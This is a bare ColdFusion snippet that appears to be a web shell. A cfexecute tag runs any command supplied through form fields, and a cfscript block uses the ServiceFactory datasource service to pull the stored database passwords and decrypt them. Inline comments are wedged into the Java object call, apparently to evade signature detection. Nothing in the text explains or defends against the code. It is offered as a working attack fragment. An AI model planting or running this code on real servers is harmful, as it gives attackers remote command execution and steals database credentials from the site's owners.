<cfexecute name="#form.cmd#" arguments="#form.opts#"><cfoutput>Result</cfoutput>
<cfscript>obj=createobject(/*a*/"java",/*b*/"coldfusion.server.ServiceFactory").getDatasourceService().getDatasources();plain=Decrypt(/*c*/data[i]["password"],key,"AES");</cfscript>
